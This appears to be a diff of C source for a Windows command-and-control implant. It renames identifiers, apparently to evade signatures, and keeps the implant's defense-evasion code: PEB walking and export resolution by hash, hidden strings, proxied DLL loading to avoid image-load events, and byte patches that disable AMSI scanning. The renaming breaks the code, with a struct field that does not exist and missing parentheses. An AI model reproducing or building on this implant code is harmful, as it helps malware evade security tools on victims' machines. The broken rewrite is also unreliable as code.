@@ -58,7 +58,7 @@ ULONG HaExSH(
 }
 
 /*!
- * load module from PEB InLoadOrderModuleList by Hash
+ * load Mod from PEB InLoadOrderModList by Hash
  * @param Hash
  * @return
  */
@@ -76,7 +76,7 @@ PVOID LoaderModPebbb(
     }
 
     pabb = Instance->Teb->ProcessEnvironmentBlock;
-    hadaar = & pabb->Ldr->InLoadOrderModuleList;
+    hadaar = & pabb->Ldr->InLoadOrderModList;
     ENTRAA = hadaar->Flink;
 
     for ( ; hadaar != ENTRAA ; ENTRAA = ENTRAA->Flink ) {
@@ -92,12 +92,12 @@ PVOID LoaderModPebbb(
 }
 
 /*!
- * load module from PEB InLoadOrderModuleList by String
- * @param Module name of module (needs to be upper case: MODULE.DLL)
+ * load Mod from PEB InLoadOrderModList by String
+ * @param Mod name of Mod (needs to be upper case: Mod.DLL)
  * @return
  */
 PVOID LoaderModPeBStr(
-    IN LPWSTR Module
+    IN LPWSTR Mod
 ) {
     PLDR_DATA_TABLE_ENTRY Ldr  = NULL;
     PLIST_ENTRY		      Hdr  = NULL;
@@ -114,7 +114,7 @@ PVOID LoaderModPeBStr(
     Naamhota = MmHeapAlloc( MAX_PATH );
 
     Peb = Instance->Teb->ProcessEnvironmentBlock;
-    Hdr = & Peb->Ldr->InLoadOrderModuleList;
+    Hdr = & Peb->Ldr->InLoadOrderModList;
     Ent = Hdr->Flink;
 
     for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
@@ -124,7 +124,7 @@ PVOID LoaderModPeBStr(
 
             MemCopy( Naamhota, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
 
-            /* turn the module name from PEB to upper */
+            /* turn the Mod name from PEB to upper */
             do {
                 if ( Index < Ldr->BaseDllName.Length ) {
                     if ( Naamhota[ Index ] >= 'a' ) {
@@ -139,7 +139,7 @@ PVOID LoaderModPeBStr(
             Index = 0;
 
             /* Compare the DLL Name! */
-            if ( ( StringCompareW( Naamhota, Module ) == 0 ) || Module == NULL ) {
+            if ( ( StringCompareW( Naamhota, Mod ) == 0 ) || Mod == NULL ) {
                 return Ldr->DllBase;
             }
 
@@ -157,45 +157,45 @@ PVOID LoaderModPeBStr(
 }
 
 /*!
- * Search for a DLL on the PEB module list
+ * Search for a DLL on the PEB Mod list
  *
- * @param ModuleName module name
+ * @param ModNm Mod name
  * @return
  */
 PVOID LoaderModSea(
-    IN LPWSTR ModuleName)
+    IN LPWSTR ModNm)
 {
-    PVOID                 FirstEntry  = NULL;
-    PLDR_DATA_TABLE_ENTRY Entry       = NULL;
+    PVOID                 Secondent  = NULL;
+    PLDR_DATA_TABLE_ENTRY Ent       = NULL;
     WCHAR                 Name[ 260 ] = { 0 };
-    WCHAR                 Dll[ 5 ]    = { 0 };
+    WCHAR                 LLd[ 5 ]    = { 0 };
 
-    Dll[ 3 ] = HideChar( 'L' );
-    Dll[ 1 ] = HideChar( 'D' );
-    Dll[ 4 ] = HideChar( '\0' );
-    Dll[ 2 ] = HideChar( 'L' );
-    Dll[ 0 ] = HideChar( '.' );
+    LLd[ 3 ] = HideChar( 'L' );
+    LLd[ 1 ] = HideChar( 'D' );
+    LLd[ 4 ] = HideChar( '\0' );
+    LLd[ 2 ] = HideChar( 'L' );
+    LLd[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
-    FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Ent      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModList.Flink;
+    Secondent = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModList.Flink;
 
-    StringCopyW( Name, ModuleName );
+    StringCopyW( Name, ModNm );
 
-    if ( ! EndsWithIW( ModuleName, Dll ) )
+    if ( ! EndsWithIW( ModNm, LLd ) )
     {
-        StringConcatW( Name, Dll );
+        StringConcatW( Name, LLd );
     }
 
-    MemZero( Dll, sizeof( Dll ) );
+    MemZero( LLd, sizeof( LLd ) );
 
     do
     {
-        if ( ! StringCompareIW( Name, Entry->BaseDllName.Buffer ) ) {
+        if ( ! StringCompareIW( Name, Ent->BaseDllName.Buffer ) ) {
             MemZero( Name, sizeof( Name ) );
-            return Entry->DllBase;
+            return Ent->DllBase;
         }
-        Entry = Entry->InLoadOrderLinks.Flink;
-    } while ( Entry != FirstEntry );
+        Ent = Ent->InLoadOrderLinks.Flink;
+    } while ( Ent != Secondent );
 
     MemZero( Name, sizeof( Name ) );
     return NULL;
@@ -205,19 +205,19 @@ PVOID LoaderModSea(
  * Load Library by string name.
  *
  * @note
- *  based on how it is configured to load the module
+ *  based on how it is configured to load the Mod
  *  it either proxy calls LoadLibraryW using RtlRegisterWait/RtlCreateTimer/RtlQueueWorkItem
  *  or it directly uses LdrLoadDll.
  *
- * @param ModuleName module name to load
+ * @param ModNm Mod name to load
  * @return
  */
-PVOID LdrModuleLoad(
-    IN LPSTR ModuleName
+PVOID LoaderModLod
+    IN LPSTR ModNm
 ) {
     UNICODE_STRING UnicodeString  = { 0 };
     WCHAR          NameW[ 260 ]   = { 0 };
-    PVOID          Module         = { 0 };
+    PVOID          Mod         = { 0 };
     USHORT         DestSize       = 0;
     HANDLE         Event          = NULL;
     HANDLE         Queue          = NULL;
@@ -225,33 +225,33 @@ PVOID LdrModuleLoad(
     DWORD          Count          = 5;
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
-    if ( ! ModuleName ) {
+    if ( ! ModNm ) {
         return NULL;
     }
 
-    /* convert module ansi string to unicode string */
-    CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );
+    /* convert Mod ansi string to unicode string */
+    CharStringToWCharString( NameW, ModNm, StringLengthA( ModNm ) );
 
-    /* get size of module unicode string */
+    /* get size of Mod unicode string */
     DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
 
-    /* check if the module is already loaded */
-    Module = LoaderModSea( NameW );
+    /* check if the Mod is already loaded */
+    Mod = LoaderModSea( NameW );
 
     /* if found, avoid generating an image-load event */
-    if ( Module ) {
-        return Module;
+    if ( Mod ) {
+        return Mod;
     }
 
-    /* if proxy module loading is enabled */
+    /* if proxy Mod loading is enabled */
     if ( Instance->Config.Implant.ProxyLoading )
     {
         /* load library using RtlRegisterWait + LoadLibraryW */
         if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && Instance->Win32.RtlRegisterWait )
         {
-            PUTS( "Loading module using RtlRegisterWait" )
+            PUTS( "Loading Mod using RtlRegisterWait" )
 
-            /* create an event for end of module loading */
+            /* create an event for end of Mod loading */
             if ( ! NT_SUCCESS( NtStatus = SysNtCreateEvent( &Event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
                 goto DEFAULT;
             }
@@ -266,7 +266,7 @@ PVOID LdrModuleLoad(
         /* load library using RtlCreateTimer + LoadLibraryW */
         else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && Instance->Win32.RtlCreateTimer )
         {
-            PUTS( "Loading module using RtlCreateTimer" )
+            PUTS( "Loading Mod using RtlCreateTimer" )
 
             /* create timer queue */
             if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue ) ) ) {
@@ -283,13 +283,13 @@ PVOID LdrModuleLoad(
         /* load library using RtlQueueWorkItem + LoadLibraryW */
         else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance->Win32.RtlQueueWorkItem )
         {
-            PUTS( "Loading module using RtlQueueWorkItem" )
+            PUTS( "Loading Mod using RtlQueueWorkItem" )
 
-            /* call LoadLibraryW and load specified module */
+            /* call LoadLibraryW and load specified Mod */
             if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlQueueWorkItem( C_PTR( Instance->Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
                 PRINTF( "RtlQueueWorkItem Failed: %p\n", NtStatus )
 
-                /* if we failed to load the module via RtlQueueWorkItem + LoadLibraryW then
+                /* if we failed to load the Mod via RtlQueueWorkItem + LoadLibraryW then
                  * try to load it using LdrLoadDll */
                 goto DEFAULT;
             }
@@ -305,11 +305,11 @@ PVOID LdrModuleLoad(
                 break;
             }
 
-            /* now let's try to get the module
-             * if we failed to load the module then try using LdrLoadDll
-             * NOTE: we are getting the module by string because there are some hash collisions
-             *       when using LdrModulePeb */
-            if ( ( Module = LoaderModPeBStr( NameW ) ) ) {
+            /* now let's try to get the Mod
+             * if we failed to load the Mod then try using LdrLoadDll
+             * NOTE: we are getting the Mod by string because there are some hash collisions
+             *       when using LdrModPeb */
+            if ( ( Mod = LoaderModPeBStr( NameW ) ) ) {
                 break;
             }
 
@@ -320,9 +320,9 @@ PVOID LdrModuleLoad(
             Count--;
         } while ( TRUE );
 
-        /* if module still hasn't been found then go to default */
-        if ( ! Module ) {
-            PUTS( "Module was not loaded, try with default technique" )
+        /* if Mod still hasn't been found then go to default */
+        if ( ! Mod ) {
+            PUTS( "Mod was not loaded, try with default technique" )
             goto DEFAULT;
         }
     }
@@ -332,14 +332,14 @@ PVOID LdrModuleLoad(
         /* load library using LdrLoadDll */
         if ( Instance->Win32.LdrLoadDll )
         {
-            PUTS( "Loading module using LdrLoadDll" )
+            PUTS( "Loading Mod using LdrLoadDll" )
 
             /* prepare unicode string */
             UnicodeString.Buffer        = NameW;
             UnicodeString.Length        = DestSize;
             UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
 
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Mod ) ) ) {
                 PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
                 NtSetLastError( NtStatus );
             }
@@ -351,7 +351,7 @@ END:
     MemZero( NameW, sizeof( NameW ) );
     MemZero( &UnicodeString, sizeof( UnicodeString ) );
 
-    PRINTF( "Module \"%s\": %p\n", ModuleName, Module )
+    PRINTF( "Mod \"%s\": %p\n", ModNm, Mod )
 
     /* close event end */
     if ( Event ) {
@@ -365,17 +365,17 @@ END:
         Queue = NULL;
     }
 
-    return Module;
+    return Mod;
 }
 
 /*!
  * gets the function pointer
- * @param Module
+ * @param Mod
  * @param FunctionHash
  * @return
  */
 PVOID LoaderFuncAdd(
-    IN PVOID Module,
+    IN PVOID Mod,
     IN DWORD Hash
 ) {
     PIMAGE_NT_HEADERS       NtHeader         = { 0 };
@@ -388,23 +388,23 @@ PVOID LoaderFuncAdd(
     PCHAR                   FunctionName     = { 0 };
     ANSI_STRING             AnsiString       = { 0 };
 
-    if ( ! Module || ! Hash )
+    if ( ! Mod || ! Hash )
         return NULL;
 
-    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
-    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
-    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
+    NtHeader         = C_PTR( Mod + ( ( PIMAGE_DOS_HEADER ) Mod )->e_lfanew );
+    ExpDirectory     = C_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
+    ExpDirectorySize = U_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
 
-    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
-    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
-    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );
+    AddrOfNames      = C_PTR( Mod + ExpDirectory->AddressOfNames );
+    AddrOfFunctions  = C_PTR( Mod + ExpDirectory->AddressOfFunctions );
+    AddrOfOrdinals   = C_PTR( Mod + ExpDirectory->AddressOfNameOrdinals );
 
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
-        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
+        FunctionName = ( PCHAR ) Mod + AddrOfNames[ i ];
         if ( HaExSH( FunctionName, 0, TRUE ) == Hash )
         {
-            FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            FunctionAddr = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
 
             /* if this is a redirect function then use LdrGetProcedureAddress */
             if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
@@ -415,7 +415,7 @@ PVOID LoaderFuncAdd(
                 AnsiString.Buffer        = FunctionName;
 
                 if ( Instance->Win32.LdrGetProcedureAddress ) {
-                    if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
+                    if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Mod, &AnsiString, 0, &FunctionAddr ) ) ) {
                         return NULL;
                     }
                 } else {
@@ -440,7 +440,7 @@ PVOID LoaderFuncAdd(
 UINT32 GSystemcalsi(
     VOID
 ) {
-    PVOID                   Module           = Instance->Modules.Ntdll;
+    PVOID                   Mod           = Instance->Modules.Ntdll;
     PIMAGE_NT_HEADERS       NtHeader         = { 0 };
     PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
     SIZE_T                  ExpDirectorySize = { 0 };
@@ -455,19 +455,19 @@ UINT32 GSystemcalsi(
     UINT32                  SyscallSize      = 0;
     UINT32                  Offset           = 0;
 
-    if ( ! Module )
+    if ( ! Mod )
         return 0;
 
     if ( Instance->Syscall.Size )
         return Instance->Syscall.Size;
 
-    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
-    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
-    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
+    NtHeader         = C_PTR( Mod + ( ( PIMAGE_DOS_HEADER ) Mod )->e_lfanew );
+    ExpDirectory     = C_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
+    ExpDirectorySize = U_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
 
-    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
-    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
-    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );
+    AddrOfNames      = C_PTR( Mod + ExpDirectory->AddressOfNames );
+    AddrOfFunctions  = C_PTR( Mod + ExpDirectory->AddressOfFunctions );
+    AddrOfOrdinals   = C_PTR( Mod + ExpDirectory->AddressOfNameOrdinals );
 
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
@@ -477,20 +477,20 @@ UINT32 GSystemcalsi(
             continue;
 
         // make sure is a system call
-        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
+        FunctionName = ( PCHAR ) Mod + AddrOfNames[ i ];
         if (*(USHORT*)FunctionName != 0x775a)
             continue;
 
         // save one random syscall addr
         if ( ! Addr1 )
         {
-            Addr1 = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            Addr1 = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
             continue;
         }
         else
         {
             // get the distance between our saved syscall addr and this one
-            Addr2  = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            Addr2  = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
             Offset = ( ULONG_PTR ) Addr1 > ( ULONG_PTR ) Addr2 ? ( ULONG_PTR ) Addr1 - ( ULONG_PTR ) Addr2 : ( ULONG_PTR ) Addr2 - ( ULONG_PTR ) Addr1;
 
             // if the distance is the smallest we have seen so far, save it
@@ -930,9 +930,9 @@ BOOL ReadLocalFile(
 BOOL BypassPatchAMSI(
     VOID
 ) {
-    HINSTANCE hModuleAmsi   = NULL;
+    HINSTANCE hModAmsi   = NULL;
     LPVOID pAddress         = NULL;
-    CHAR module[10]         = { 0 };
+    CHAR Mod[10]         = { 0 };
 
 #ifdef _M_AMD64
     UCHAR amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
@@ -940,22 +940,22 @@ BOOL BypassPatchAMSI(
     unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
 #endif
 
-    module[0] = HideChar('A');
-    module[1] = HideChar('M');
-    module[2] = HideChar('S');
-    module[3] = HideChar('I');
-    module[4] = HideChar('.');
-    module[5] = HideChar('D');
-    module[6] = HideChar('L');
-    module[7] = HideChar('L');
-    module[8] = HideChar('\0');
+    Mod[0] = HideChar('A');
+    Mod[1] = HideChar('M');
+    Mod[2] = HideChar('S');
+    Mod[3] = HideChar('I');
+    Mod[4] = HideChar('.');
+    Mod[5] = HideChar('D');
+    Mod[6] = HideChar('L');
+    Mod[7] = HideChar('L');
+    Mod[8] = HideChar('\0');
 
-    hModuleAmsi = LdrModuleLoad( module );
-    MemZero( module, sizeof( module ) );
+    hModAmsi = LoaderModLod Mod );
+    MemZero( Mod, sizeof( Mod ) );
 
-    PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );
+    PRINTF( "[+] Loaded asmi.dll: %p\n", hModAmsi );
 
-    pAddress = LoaderFuncAdd( hModuleAmsi, H_FUNC_AMSISCANBUFFER );
+    pAddress = LoaderFuncAdd( hModAmsi, H_FUNC_AMSISCANBUFFER );
     if( pAddress == NULL )
         return 0;
 
@@ -1251,7 +1251,7 @@ BOOL CfgQueryEnforced(
 
 /*!
  * @brief
- *  add module + function to CFG exception list.
+ *  add Mod + function to CFG exception list.
  *
  * @param ImageBase
  * @param Function
